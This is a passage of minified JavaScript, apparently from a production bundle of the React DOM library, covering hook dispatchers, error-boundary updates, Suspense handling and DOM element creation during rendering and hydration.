Qg(t,e,n,r){e.value=n,e.getSnapshot=r,Jg(e)&&Zg(t)}function Xg(t,e,n){return n(function(){Jg(e)&&Zg(t)})}function Jg(t){var e=t.getSnapshot;t=t.value;try{var n=e();return!yt(t,n)}catch{return!0}}function Zg(t){var e=Wt(t,1);e!==null&&_t(e,t,1,-1)}function Lf(t){var e=Ct();return typeof t=="function"&&(t=t()),e.memoizedState=e.baseState=t,t={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Es,lastRenderedState:t},e.queue=t,t=t.dispatch=LE.bind(null,re,t),[e.memoizedState,t]}function Cs(t,e,n,r){return t={tag:t,create:e,destroy:n,deps:r,next:null},e=re.updateQueue,e===null?(e={lastEffect:null,stores:null},re.updateQueue=e,e.lastEffect=t.next=t):(n=e.lastEffect,n===null?e.lastEffect=t.next=t:(r=n.next,n.next=t,t.next=r,e.lastEffect=t)),t}function e_(){return ot().memoizedState}function Mo(t,e,n,r){var i=Ct();re.flags|=t,i.memoizedState=Cs(1|e,n,void 0,r===void 0?null:r)}function ea(t,e,n,r){var i=ot();r=r===void 0?null:r;var s=void 0;if(he!==null){var o=he.memoizedState;if(s=o.destroy,r!==null&&yd(r,o.deps)){i.memoizedState=Cs(e,n,s,r);return}}re.flags|=t,i.memoizedState=Cs(1|e,n,s,r)}function Df(t,e){return Mo(8390656,8,t,e)}function Cd(t,e){return ea(2048,8,t,e)}function t_(t,e){return ea(4,2,t,e)}function n_(t,e){return ea(4,4,t,e)}function r_(t,e){if(typeof e=="function")return t=t(),e(t),function(){e(null)};if(e!=null)return t=t(),e.current=t,function(){e.current=null}}function i_(t,e,n){return n=n!=null?n.concat([t]):null,ea(4,4,r_.bind(null,e,t),n)}function Sd(){}function s_(t,e){var n=ot();e=e===void 0?null:e;var r=n.memoizedState;return r!==null&&e!==null&&yd(e,r[1])?r[0]:(n.memoizedState=[t,e],t)}function o_(t,e){var n=ot();e=e===void 0?null:e;var r=n.memoizedState;return r!==null&&e!==null&&yd(e,r[1])?r[0]:(t=t(),n.memoizedState=[t,e],t)}function l_(t,e,n){return tr&21?(yt(n,e)||(n=cg(),re.lanes|=n,nr|=n,t.baseState=!0),e):(t.baseState&&(t.baseState=!1,ze=!0),t.memoizedState=n)}function OE(t,e){var n=$;$=n!==0&&4>n?n:4,t(!0);var r=Ga.transition;Ga.transition={};try{t(!1),e()}finally{$=n,Ga.transition=r}}function a_(){return ot().memoizedState}function bE(t,e,n){var r=yn(t);if(n={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null},u_(t))c_(e,n);else if(n=zg(t,e,n,r),n!==null){var i=Le();_t(n,t,r,i),d_(n,e,r)}}function LE(t,e,n){var r=yn(t),i={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null};if(u_(t))c_(e,i);else{var s=t.alternate;if(t.lanes===0&&(s===null||s.lanes===0)&&(s=e.lastRenderedReducer,s!==null))try{var o=e.lastRenderedState,l=s(o,n);if(i.hasEagerState=!0,i.eagerState=l,yt(l,o)){var a=e.interleaved;a===null?(i.next=i,pd(e)):(i.next=a.next,a.next=i),e.interleaved=i;return}}catch{}finally{}n=zg(t,e,i,r),n!==null&&(i=Le(),_t(n,t,r,i),d_(n,e,r))}}function u_(t){var e=t.alternate;return t===re||e!==null&&e===re}function c_(t,e){Xi=ul=!0;var n=t.pending;n===null?e.next=e:(e.next=n.next,n.next=e),t.pending=e}function d_(t,e,n){if(n&4194240){var r=e.lanes;r&=t.pendingLanes,n|=r,e.lanes=n,ed(t,n)}}var cl={readContext:st,useCallback:ke,useContext:ke,useEffect:ke,useImperativeHandle:ke,useInsertionEffect:ke,useLayoutEffect:ke,useMemo:ke,useReducer:ke,useRef:ke,useState:ke,useDebugValue:ke,useDeferredValue:ke,useTransition:ke,useMutableSource:ke,useSyncExternalStore:ke,useId:ke,unstable_isNewReconciler:!1},DE={readContext:st,useCallback:function(t,e){return Ct().memoizedState=[t,e===void 0?null:e],t},useContext:st,useEffect:Df,useImperativeHandle:function(t,e,n){return n=n!=null?n.concat([t]):null,Mo(4194308,4,r_.bind(null,e,t),n)},useLayoutEffect:function(t,e){return Mo(4194308,4,t,e)},useInsertionEffect:function(t,e){return Mo(4,2,t,e)},useMemo:function(t,e){var n=Ct();return e=e===void 0?null:e,t=t(),n.memoizedState=[t,e],t},useReducer:function(t,e,n){var r=Ct();return e=n!==void 0?n(e):e,r.memoizedState=r.baseState=e,t={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:t,lastRenderedState:e},r.queue=t,t=t.dispatch=bE.bind(null,re,t),[r.memoizedState,t]},useRef:function(t){var e=Ct();return t={current:t},e.memoizedState=t},useState:Lf,useDebugValue:Sd,useDeferredValue:function(t){return Ct().memoizedState=t},useTransition:function(){var t=Lf(!1),e=t[0];return t=OE.bind(null,t[1]),Ct().memoizedState=t,[e,t]},useMutableSource:function(){},useSyncExternalStore:function(t,e,n){var r=re,i=Ct();if(te){if(n===void 0)throw Error(C(407));n=n()}else{if(n=e(),we===null)throw Error(C(349));tr&30||Yg(r,e,n)}i.memoizedState=n;var s={value:n,getSnapshot:e};return i.queue=s,Df(Xg.bind(null,r,s,t),[t]),r.flags|=2048,Cs(9,Qg.bind(null,r,s,n,e),void 0,null),n},useId:function(){var t=Ct(),e=we.identifierPrefix;if(te){var n=Lt,r=bt;n=(r&~(1<<32-gt(r)-1)).toString(32)+n,e=":"+e+"R"+n,n=ws++,0<n&&(e+="H"+n.toString(32)),e+=":"}else n=AE++,e=":"+e+"r"+n.toString(32)+":";return t.memoizedState=e},unstable_isNewReconciler:!1},ME={readContext:st,useCallback:s_,useContext:st,useEffect:Cd,useImperativeHandle:i_,useInsertionEffect:t_,useLayoutEffect:n_,useMemo:o_,useReducer:Ka,useRef:e_,useState:function(){return Ka(Es)},useDebugValue:Sd,useDeferredValue:function(t){var e=ot();return l_(e,he.memoizedState,t)},useTransition:function(){var t=Ka(Es)[0],e=ot().memoizedState;return[t,e]},useMutableSource:Gg,useSyncExternalStore:Kg,useId:a_,unstable_isNewReconciler:!1},UE={readContext:st,useCallback:s_,useContext:st,useEffect:Cd,useImperativeHandle:i_,useInsertionEffect:t_,useLayoutEffect:n_,useMemo:o_,useReducer:Ya,useRef:e_,useState:function(){return Ya(Es)},useDebugValue:Sd,useDeferredValue:function(t){var e=ot();return he===null?e.memoizedState=t:l_(e,he.memoizedState,t)},useTransition:function(){var t=Ya(Es)[0],e=ot().memoizedState;return[t,e]},useMutableSource:Gg,useSyncExternalStore:Kg,useId:a_,unstable_isNewReconciler:!1};function ii(t,e){try{var n="",r=e;do n+=d0(r),r=r.return;while(r);var i=n}catch(s){i=`
Error generating stack: `+s.message+`
`+s.stack}return{value:t,source:e,stack:i,digest:null}}function Qa(t,e,n){return{value:t,source:null,stack:n??null,digest:e??null}}function ec(t,e){try{console.error(e.value)}catch(n){setTimeout(function(){throw n})}}var FE=typeof WeakMap=="function"?WeakMap:Map;function h_(t,e,n){n=Ft(-1,n),n.tag=3,n.payload={element:null};var r=e.value;return n.callback=function(){hl||(hl=!0,cc=r),ec(t,e)},n}function f_(t,e,n){n=Ft(-1,n),n.tag=3;var r=t.type.getDerivedStateFromError;if(typeof r=="function"){var i=e.value;n.payload=function(){return r(i)},n.callback=function(){ec(t,e)}}var s=t.stateNode;return s!==null&&typeof s.componentDidCatch=="function"&&(n.callback=function(){ec(t,e),typeof r!="function"&&(vn===null?vn=new Set([this]):vn.add(this));var o=e.stack;this.componentDidCatch(e.value,{componentStack:o!==null?o:""})}),n}function Mf(t,e,n){var r=t.pingCache;if(r===null){r=t.pingCache=new FE;var i=new Set;r.set(e,i)}else i=r.get(e),i===void 0&&(i=new Set,r.set(e,i));i.has(n)||(i.add(n),t=JE.bind(null,t,e,n),e.then(t,t))}function Uf(t){do{var e;if((e=t.tag===13)&&(e=t.memoizedState,e=e!==null?e.dehydrated!==null:!0),e)return t;t=t.return}while(t!==null);return null}function Ff(t,e,n,r,i){return t.mode&1?(t.flags|=65536,t.lanes=i,t):(t===e?t.flags|=65536:(t.flags|=128,n.flags|=131072,n.flags&=-52805,n.tag===1&&(n.alternate===null?n.tag=17:(e=Ft(-1,1),e.tag=2,_n(n,e,1))),n.lanes|=1),t)}var jE=Kt.ReactCurrentOwner,ze=!1;function be(t,e,n,r){e.child=t===null?Vg(e,null,n,r):ni(e,t.child,n,r)}function jf(t,e,n,r,i){n=n.render;var s=e.ref;return $r(e,i),r=wd(t,e,n,r,s,i),n=Ed(),t!==null&&!ze?(e.updateQueue=t.updateQueue,e.flags&=-2053,t.lanes&=~i,$t(t,e,i)):(te&&n&&ad(e),e.flags|=1,be(t,e,r,i),e.child)}function zf(t,e,n,r,i){if(t===null){var s=n.type;return typeof s=="function"&&!Ad(s)&&s.defaultProps===void 0&&n.compare===null&&n.defaultProps===void 0?(e.tag=15,e.type=s,p_(t,e,s,r,i)):(t=zo(n.type,null,r,e,e.mode,i),t.ref=e.ref,t.return=e,e.child=t)}if(s=t.child,!(t.lanes&i)){var o=s.memoizedProps;if(n=n.compare,n=n!==null?n:ps,n(o,r)&&t.ref===e.ref)return $t(t,e,i)}return e.flags|=1,t=wn(s,r),t.ref=e.ref,t.return=e,e.child=t}function p_(t,e,n,r,i){if(t!==null){var s=t.memoizedProps;if(ps(s,r)&&t.ref===e.ref)if(ze=!1,e.pendingProps=r=s,(t.lanes&i)!==0)t.flags&131072&&(ze=!0);else return e.lanes=t.lanes,$t(t,e,i)}return tc(t,e,n,r,i)}function m_(t,e,n){var r=e.pendingProps,i=r.children,s=t!==null?t.memoizedState:null;if(r.mode==="hidden")if(!(e.mode&1))e.memoizedState={baseLanes:0,cachePool:null,transitions:null},K(Ur,Ke),Ke|=n;else{if(!(n&1073741824))return t=s!==null?s.baseLanes|n:n,e.lanes=e.childLanes=1073741824,e.memoizedState={baseLanes:t,cachePool:null,transitions:null},e.updateQueue=null,K(Ur,Ke),Ke|=t,null;e.memoizedState={baseLanes:0,cachePool:null,transitions:null},r=s!==null?s.baseLanes:n,K(Ur,Ke),Ke|=r}else s!==null?(r=s.baseLanes|n,e.memoizedState=null):r=n,K(Ur,Ke),Ke|=r;return be(t,e,i,n),e.child}function g_(t,e){var n=e.ref;(t===null&&n!==null||t!==null&&t.ref!==n)&&(e.flags|=512,e.flags|=2097152)}function tc(t,e,n,r,i){var s=$e(n)?Zn:xe.current;return s=ei(e,s),$r(e,i),n=wd(t,e,n,r,s,i),r=Ed(),t!==null&&!ze?(e.updateQueue=t.updateQueue,e.flags&=-2053,t.lanes&=~i,$t(t,e,i)):(te&&r&&ad(e),e.flags|=1,be(t,e,n,i),e.child)}function Bf(t,e,n,r,i){if($e(n)){var s=!0;nl(e)}else s=!1;if($r(e,i),e.stateNode===null)Uo(t,e),Wg(e,n,r),Zu(e,n,r,i),r=!0;else if(t===null){var o=e.stateNode,l=e.memoizedProps;o.props=l;var a=o.context,u=n.contextType;typeof u=="object"&&u!==null?u=st(u):(u=$e(n)?Zn:xe.current,u=ei(e,u));var c=n.getDerivedStateFromProps,d=typeof c=="function"||typeof o.getSnapshotBeforeUpdate=="function";d||typeof o.UNSAFE_componentWillReceiveProps!="function"&&typeof o.componentWillReceiveProps!="function"||(l!==r||a!==u)&&Of(e,o,r,u),tn=!1;var h=e.memoizedState;o.state=h,ll(e,r,o,i),a=e.memoizedState,l!==r||h!==a||We.current||tn?(typeof c=="function"&&(Ju(e,n,c,r),a=e.memoizedState),(l=tn||Af(e,n,l,r,h,a,u))?(d||typeof o.UNSAFE_componentWillMount!="function"&&typeof o.componentWillMount!="function"||(typeof o.componentWillMount=="function"&&o.componentWillMount(),typeof o.UNSAFE_componentWillMount=="function"&&o.UNSAFE_componentWillMount()),typeof o.componentDidMount=="function"&&(e.flags|=4194308)):(typeof o.componentDidMount=="function"&&(e.flags|=4194308),e.memoizedProps=r,e.memoizedState=a),o.props=r,o.state=a,o.context=u,r=l):(typeof o.componentDidMount=="function"&&(e.flags|=4194308),r=!1)}else{o=e.stateNode,Bg(t,e),l=e.memoizedProps,u=e.type===e.elementType?l:ut(e.type,l),o.props=u,d=e.pendingProps,h=o.context,a=n.contextType,typeof a=="object"&&a!==null?a=st(a):(a=$e(n)?Zn:xe.current,a=ei(e,a));var m=n.getDerivedStateFromProps;(c=typeof m=="function"||typeof o.getSnapshotBeforeUpdate=="function")||typeof o.UNSAFE_componentWillReceiveProps!="function"&&typeof o.componentWillReceiveProps!="function"||(l!==d||h!==a)&&Of(e,o,r,a),tn=!1,h=e.memoizedState,o.state=h,ll(e,r,o,i);var _=e.memoizedState;l!==d||h!==_||We.current||tn?(typeof m=="function"&&(Ju(e,n,m,r),_=e.memoizedState),(u=tn||Af(e,n,u,r,h,_,a)||!1)?(c||typeof o.UNSAFE_componentWillUpdate!="function"&&typeof o.componentWillUpdate!="function"||(typeof o.componentWillUpdate=="function"&&o.componentWillUpdate(r,_,a),typeof o.UNSAFE_componentWillUpdate=="function"&&o.UNSAFE_componentWillUpdate(r,_,a)),typeof o.componentDidUpdate=="function"&&(e.flags|=4),typeof o.getSnapshotBeforeUpdate=="function"&&(e.flags|=1024)):(typeof o.componentDidUpdate!="function"||l===t.memoizedProps&&h===t.memoizedState||(e.flags|=4),typeof o.getSnapshotBeforeUpdate!="function"||l===t.memoizedProps&&h===t.memoizedState||(e.flags|=1024),e.memoizedProps=r,e.memoizedState=_),o.props=r,o.state=_,o.context=a,r=u):(typeof o.componentDidUpdate!="function"||l===t.memoizedProps&&h===t.memoizedState||(e.flags|=4),typeof o.getSnapshotBeforeUpdate!="function"||l===t.memoizedProps&&h===t.memoizedState||(e.flags|=1024),r=!1)}return nc(t,e,n,r,s,i)}function nc(t,e,n,r,i,s){g_(t,e);var o=(e.flags&128)!==0;if(!r&&!o)return i&&kf(e,n,!1),$t(t,e,s);r=e.stateNode,jE.current=e;var l=o&&typeof n.getDerivedStateFromError!="function"?null:r.render();return e.flags|=1,t!==null&&o?(e.child=ni(e,t.child,null,s),e.child=ni(e,null,l,s)):be(t,e,l,s),e.memoizedState=r.state,i&&kf(e,n,!0),e.child}function __(t){var e=t.stateNode;e.pendingContext?If(t,e.pendingContext,e.pendingContext!==e.context):e.context&&If(t,e.context,!1),gd(t,e.containerInfo)}function Hf(t,e,n,r,i){return ti(),cd(i),e.flags|=256,be(t,e,n,r),e.child}var rc={dehydrated:null,treeContext:null,retryLane:0};function ic(t){return{baseLanes:t,cachePool:null,transitions:null}}function v_(t,e,n){var r=e.pendingProps,i=ne.current,s=!1,o=(e.flags&128)!==0,l;if((l=o)||(l=t!==null&&t.memoizedState===null?!1:(i&2)!==0),l?(s=!0,e.flags&=-129):(t===null||t.memoizedState!==null)&&(i|=1),K(ne,i&1),t===null)return Qu(e),t=e.memoizedState,t!==null&&(t=t.dehydrated,t!==null)?(e.mode&1?t.data==="$!"?e.lanes=8:e.lanes=1073741824:e.lanes=1,null):(o=r.children,t=r.fallback,s?(r=e.mode,s=e.child,o={mode:"hidden",children:o},!(r&1)&&s!==null?(s.childLanes=0,s.pendingProps=o):s=ra(o,r,0,null),t=Kn(t,r,n,null),s.return=e,t.return=e,s.sibling=t,e.child=s,e.child.memoizedState=ic(n),e.memoizedState=rc,t):Td(e,o));if(i=t.memoizedState,i!==null&&(l=i.dehydrated,l!==null))return zE(t,e,o,r,l,i,n);if(s){s=r.fallback,o=e.mode,i=t.child,l=i.sibling;var a={mode:"hidden",children:r.children};return!(o&1)&&e.child!==i?(r=e.child,r.childLanes=0,r.pendingProps=a,e.deletions=null):(r=wn(i,a),r.subtreeFlags=i.subtreeFlags&14680064),l!==null?s=wn(l,s):(s=Kn(s,o,n,null),s.flags|=2),s.return=e,r.return=e,r.sibling=s,e.child=r,r=s,s=e.child,o=t.child.memoizedState,o=o===null?ic(n):{baseLanes:o.baseLanes|n,cachePool:null,transitions:o.transitions},s.memoizedState=o,s.childLanes=t.childLanes&~n,e.memoizedState=rc,r}return s=t.child,t=s.sibling,r=wn(s,{mode:"visible",children:r.children}),!(e.mode&1)&&(r.lanes=n),r.return=e,r.sibling=null,t!==null&&(n=e.deletions,n===null?(e.deletions=[t],e.flags|=16):n.push(t)),e.child=r,e.memoizedState=null,r}function Td(t,e){return e=ra({mode:"visible",children:e},t.mode,0,null),e.return=t,t.child=e}function wo(t,e,n,r){return r!==null&&cd(r),ni(e,t.child,null,n),t=Td(e,e.pendingProps.children),t.flags|=2,e.memoizedState=null,t}function zE(t,e,n,r,i,s,o){if(n)return e.flags&256?(e.flags&=-257,r=Qa(Error(C(422))),wo(t,e,o,r)):e.memoizedState!==null?(e.child=t.child,e.flags|=128,null):(s=r.fallback,i=e.mode,r=ra({mode:"visible",children:r.children},i,0,null),s=Kn(s,i,o,null),s.flags|=2,r.return=e,s.return=e,r.sibling=s,e.child=r,e.mode&1&&ni(e,t.child,null,o),e.child.memoizedState=ic(o),e.memoizedState=rc,s);if(!(e.mode&1))return wo(t,e,o,null);if(i.data==="$!"){if(r=i.nextSibling&&i.nextSibling.dataset,r)var l=r.dgst;return r=l,s=Error(C(419)),r=Qa(s,r,void 0),wo(t,e,o,r)}if(l=(o&t.childLanes)!==0,ze||l){if(r=we,r!==null){switch(o&-o){case 4:i=2;break;case 16:i=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:i=32;break;case 536870912:i=268435456;break;default:i=0}i=i&(r.suspendedLanes|o)?0:i,i!==0&&i!==s.retryLane&&(s.retryLane=i,Wt(t,i),_t(r,t,i,-1))}return xd(),r=Qa(Error(C(421))),wo(t,e,o,r)}return i.data==="$?"?(e.flags|=128,e.child=t.child,e=ZE.bind(null,t),i._reactRetry=e,null):(t=s.treeContext,Ye=gn(i.nextSibling),Xe=e,te=!0,dt=null,t!==null&&(tt[nt++]=bt,tt[nt++]=Lt,tt[nt++]=er,bt=t.id,Lt=t.overflow,er=e),e=Td(e,r.children),e.flags|=4096,e)}function Wf(t,e,n){t.lanes|=e;var r=t.alternate;r!==null&&(r.lanes|=e),Xu(t.return,e,n)}function Xa(t,e,n,r,i){var s=t.memoizedState;s===null?t.memoizedState={isBackwards:e,rendering:null,renderingStartTime:0,last:r,tail:n,tailMode:i}:(s.isBackwards=e,s.rendering=null,s.renderingStartTime=0,s.last=r,s.tail=n,s.tailMode=i)}function y_(t,e,n){var r=e.pendingProps,i=r.revealOrder,s=r.tail;if(be(t,e,r.children,n),r=ne.current,r&2)r=r&1|2,e.flags|=128;else{if(t!==null&&t.flags&128)e:for(t=e.child;t!==null;){if(t.tag===13)t.memoizedState!==null&&Wf(t,n,e);else if(t.tag===19)Wf(t,n,e);else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break e;for(;t.sibling===null;){if(t.return===null||t.return===e)break e;t=t.return}t.sibling.return=t.return,t=t.sibling}r&=1}if(K(ne,r),!(e.mode&1))e.memoizedState=null;else switch(i){case"forwards":for(n=e.child,i=null;n!==null;)t=n.alternate,t!==null&&al(t)===null&&(i=n),n=n.sibling;n=i,n===null?(i=e.child,e.child=null):(i=n.sibling,n.sibling=null),Xa(e,!1,i,n,s);break;case"backwards":for(n=null,i=e.child,e.child=null;i!==null;){if(t=i.alternate,t!==null&&al(t)===null){e.child=i;break}t=i.sibling,i.sibling=n,n=i,i=t}Xa(e,!0,n,null,s);break;case"together":Xa(e,!1,null,null,void 0);break;default:e.memoizedState=null}return e.child}function Uo(t,e){!(e.mode&1)&&t!==null&&(t.alternate=null,e.alternate=null,e.flags|=2)}function $t(t,e,n){if(t!==null&&(e.dependencies=t.dependencies),nr|=e.lanes,!(n&e.childLanes))return null;if(t!==null&&e.child!==t.child)throw Error(C(153));if(e.child!==null){for(t=e.child,n=wn(t,t.pendingProps),e.child=n,n.return=e;t.sibling!==null;)t=t.sibling,n=n.sibling=wn(t,t.pendingProps),n.return=e;n.sibling=null}return e.child}function BE(t,e,n){switch(e.tag){case 3:__(e),ti();break;case 5:qg(e);break;case 1:$e(e.type)&&nl(e);break;case 4:gd(e,e.stateNode.containerInfo);break;case 10:var r=e.type._context,i=e.memoizedProps.value;K(sl,r._currentValue),r._currentValue=i;break;case 13:if(r=e.memoizedState,r!==null)return r.dehydrated!==null?(K(ne,ne.current&1),e.flags|=128,null):n&e.child.childLanes?v_(t,e,n):(K(ne,ne.current&1),t=$t(t,e,n),t!==null?t.sibling:null);K(ne,ne.current&1);break;case 19:if(r=(n&e.childLanes)!==0,t.flags&128){if(r)return y_(t,e,n);e.flags|=128}if(i=e.memoizedState,i!==null&&(i.rendering=null,i.tail=null,i.lastEffect=null),K(ne,ne.current),r)break;return null;case 22:case 23:return e.lanes=0,m_(t,e,n)}return $t(t,e,n)}var w_,sc,E_,C_;w_=function(t,e){for(var n=e.child;n!==null;){if(n.tag===5||n.tag===6)t.appendChild(n.stateNode);else if(n.tag!==4&&n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return;n=n.return}n.sibling.return=n.return,n=n.sibling}};sc=function(){};E_=function(t,e,n,r){var i=t.memoizedProps;if(i!==r){t=e.stateNode,Wn(kt.current);var s=null;switch(n){case"input":i=Ru(t,i),r=Ru(t,r),s=[];break;case"select":i=ie({},i,{value:void 0}),r=ie({},r,{value:void 0}),s=[];break;case"textarea":i=xu(t,i),r=xu(t,r),s=[];break;default:typeof i.onClick!="function"&&typeof r.onClick=="function"&&(t.onclick=el)}Ou(n,r);var o;n=null;for(u in i)if(!r.hasOwnProperty(u)&&i.hasOwnProperty(u)&&i[u]!=null)if(u==="style"){var l=i[u];for(o in l)l.hasOwnProperty(o)&&(n||(n={}),n[o]="")}else u!=="dangerouslySetInnerHTML"&&u!=="children"&&u!=="suppressContentEditableWarning"&&u!=="suppressHydrationWarning"&&u!=="autoFocus"&&(ls.hasOwnProperty(u)?s||(s=[]):(s=s||[]).push(u,null));for(u in r){var a=r[u];if(l=i!=null?i[u]:void 0,r.hasOwnProperty(u)&&a!==l&&(a!=null||l!=null))if(u==="style")if(l){for(o in l)!l.hasOwnProperty(o)||a&&a.hasOwnProperty(o)||(n||(n={}),n[o]="");for(o in a)a.hasOwnProperty(o)&&l[o]!==a[o]&&(n||(n={}),n[o]=a[o])}else n||(s||(s=[]),s.push(u,n)),n=a;else u==="dangerouslySetInnerHTML"?(a=a?a.__html:void 0,l=l?l.__html:void 0,a!=null&&l!==a&&(s=s||[]).push(u,a)):u==="children"?typeof a!="string"&&typeof a!="number"||(s=s||[]).push(u,""+a):u!=="suppressContentEditableWarning"&&u!=="suppressHydrationWarning"&&(ls.hasOwnProperty(u)?(a!=null&&u==="onScroll"&&Y("scroll",t),s||l===a||(s=[])):(s=s||[]).push(u,a))}n&&(s=s||[]).push("style",n);var u=s;(e.updateQueue=u)&&(e.flags|=4)}};C_=function(t,e,n,r){n!==r&&(e.flags|=4)};function Ai(t,e){if(!te)switch(t.tailMode){case"hidden":e=t.tail;for(var n=null;e!==null;)e.alternate!==null&&(n=e),e=e.sibling;n===null?t.tail=null:n.sibling=null;break;case"collapsed":n=t.tail;for(var r=null;n!==null;)n.alternate!==null&&(r=n),n=n.sibling;r===null?e||t.tail===null?t.tail=null:t.tail.sibling=null:r.sibling=null}}function Re(t){var e=t.alternate!==null&&t.alternate.child===t.child,n=0,r=0;if(e)for(var i=t.child;i!==null;)n|=i.lanes|i.childLanes,r|=i.subtreeFlags&14680064,r|=i.flags&14680064,i.return=t,i=i.sibling;else for(i=t.child;i!==null;)n|=i.lanes|i.childLanes,r|=i.subtreeFlags,r|=i.flags,i.return=t,i=i.sibling;return t.subtreeFlags|=r,t.childLanes=n,e}function HE(t,e,n){var r=e.pendingProps;switch(ud(e),e.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return Re(e),null;case 1:return $e(e.type)&&tl(),Re(e),null;case 3:return r=e.stateNode,ri(),X(We),X(xe),vd(),r.pendingContext&&(r.context=r.pendingContext,r.pendingContext=null),(t===null||t.child===null)&&(vo(e)?e.flags|=4:t===null||t.memoizedState.isDehydrated&&!(e.flags&256)||(e.flags|=1024,dt!==null&&(fc(dt),dt=null))),sc(t,e),Re(e),null;case 5:_d(e);var i=Wn(ys.current);if(n=e.type,t!==null&&e.stateNode!=null)E_(t,e,n,r,i),t.ref!==e.ref&&(e.flags|=512,e.flags|=2097152);else{if(!r){if(e.stateNode===null)throw Error(C(166));return Re(e),null}if(t=Wn(kt.current),vo(e)){r=e.stateNode,n=e.type;var s=e.memoizedProps;switch(r[St]=e,r[_s]=s,t=(e.mode&1)!==0,n){case"dialog":Y("cancel",r),Y("close",r);break;case"iframe":case"object":case"embed":Y("load",r);break;case"video":case"audio":for(i=0;i<Wi.length;i++)Y(Wi[i],r);break;case"source":Y("error",r);break;case"img":case"image":case"link":Y("error",r),Y("load",r);break;case"details":Y("toggle",r);break;case"input":Xh(r,s),Y("invalid",r);break;case"select":r._wrapperState={wasMultiple:!!s.multiple},Y("invalid",r);break;case"textarea":Zh(r,s),Y("invalid",r)}Ou(n,s),i=null;for(var o in s)if(s.hasOwnProperty(o)){var l=s[o];o==="children"?typeof l=="string"?r.textContent!==l&&(s.suppressHydrationWarning!==!0&&_o(r.textContent,l,t),i=["children",l]):typeof l=="number"&&r.textContent!==""+l&&(s.suppressHydrationWarning!==!0&&_o(r.textContent,l,t),i=["children",""+l]):ls.hasOwnProperty(o)&&l!=null&&o==="onScroll"&&Y("scroll",r)}switch(n){case"input":ao(r),Jh(r,s,!0);break;case"textarea":ao(r),ef(r);break;case"select":case"option":break;default:typeof s.onClick=="function"&&(r.onclick=el)}r=i,e.updateQueue=r,r!==null&&(e.flags|=4)}else{o=i.nodeType===9?i:i.ownerDocument,t==="http://www.w3.org/1999/xhtml"&&(t=Ym(n)),t==="http://www.w3.org/1999/xhtml"?n==="script"?(t=o.createElement("div"),t.innerHTML="<script><\/script>",t=t.removeChild(t.firstChild)):typeof r.is=="string"?t=o.createElement(n,{is:r.is}):(t=o.createElement(n),n==="select"&&(o=t,r.multiple?o.multiple=!0:r.size&&(o.size=r.size))):t=o.createElementNS(t,n),t[St]=e,t[_s]=r,w_(t,e,!1,!1),e.stateNode=t;e:{switch(o=bu(n,r),n){case"dialog":Y("cancel",t),Y("close",t),i=r;break;case"iframe":case"object":case"embed":Y("load",t),i=r;break;case"video":case"audio":for(i=0;i<Wi.length;i++)Y(Wi[i],t);i=r;break;case"source":Y("error",t),i=r;break;case"img":case"image":case"link":Y("error",t),Y("load",t),i=r;break;case"details":Y("toggle",t),i=r;break;case"input":Xh(t,r),i=Ru(t,r),Y("invalid",t);break;case"option":i=r;break;case"select":t._wrapperState={wasMultiple:!!r.multiple},i=ie({},r,{value:void 0}),Y("invalid",t);break;case"textarea":Zh(t,r),i=xu(t,r),Y("invalid",t);break;default:i=r}Ou(n,i),l=i;for(s in l)if(l.hasOwnProperty(s)){var a=l[s];s==="style"?Jm(t,a):s==="dangerouslySetInnerHTML"?(a=a?a.__html:void 0,a!=null&&Qm(t,a)):s==="children"?typeof a=="string"?(n!=="textarea"||a!=="")&&as(t,a):typeof a=="number"&&as(t,""+a):s!=="suppressContentEditableWarning"&&s!=="suppressHydrationWarning"&&s!=="autoFocus"&&(ls.hasOwnProperty(s)?a!=null&&s==="onScroll"&&Y("scroll",t):a!=null&&Kc(t,s,a,o))}switch(n){case"input":ao(t),Jh(t,r,!1);break;case"textarea":ao(t),ef(t);break;case"option":r.value!=null&&t.setAttribute("value",""+In(r.value));break;case"select":t.multiple=!!r.multiple,s=r.value,s!=null?zr(t,!!r.multiple,s,!1):r.defaultValue!=null&&zr(t,!!r.multiple,r.defaultValue,!0);break;default:typeof i.onClick=="function"&&(t.onclick=el)}switch(n){case"button":case"input":case"select":case"textarea":r=!!r.autoFocus;break e;case"img":r=!0;break e;default:r=!1}}r&&(e.flags|=4)}e.ref!==null&&(e.flags|=512,e.flags|=2097152)}return Re(e),null;case 6:if(t&&e.stateNode!=null)C_(t,e,t.memoizedProps,r);else{if(typeof r!="string"&&e.stateNode===null)throw Error(C(166));if(n=Wn(ys.current),Wn(kt.current),vo(e)){if(r=e.stateNode,n=e.memoizedProps,r[St]=e,(s=r.nodeValue!==n)&&(t=Xe,t!==null))switch(t.tag){case 3:_o(r.nodeValue,n,(t.mode&1)!==0);break;case 5:t.memoizedProps.suppressHydrationWarning!==!0&&_o(r.nodeValue,n,(t.mode&1)!==0)}s&&(e.flags|=4)}else r=(n.nodeType===9?n:n.ownerDocument).createTextNode(r),r[St]=e,e.stateNode=r}return Re(e),null;case 13:if(X(ne),r=e.memoizedState,t===null||t.memoizedState!==null&&t.memoizedState.dehydrated!==null){if(te&&Ye!==null&&e.mode&1&&!(e.flags&128))jg(),ti(),e.flags|=98560,s=!1;else if(s=vo(e),r!==null&&r.dehydrated!==null){if(t===null){if(!s)throw Error(C(318));if(s=e.memoizedState,s=s!==null?s.dehydrated:null,!s)throw Error(C(317));s[St]=e}else ti(),!(e.flags&128)&&(e.memoizedState=null),e.flags|=4;Re(e),s=!1}else dt!==null&&(fc(dt),dt=null),s=!0;if(!s)return e.flags&65536?e:null}return e.flags&128?(e.lanes=n,e):(r=r!==null,r!==(t!==null&&t.memoizedState!==null)&&r&&(e.child.flags|=8192,e.mode&1&&(t===null||ne.current&1?pe===0&&(pe=3):xd())),e.updateQueue!==null&&(e.flags|=4),Re(e),null);case 4:return ri(),sc(t,e),t===null&&ms(e.stateNode.containerInfo),Re(e),null;case 10:return fd(e.type._context),Re(e),null;case 17:return 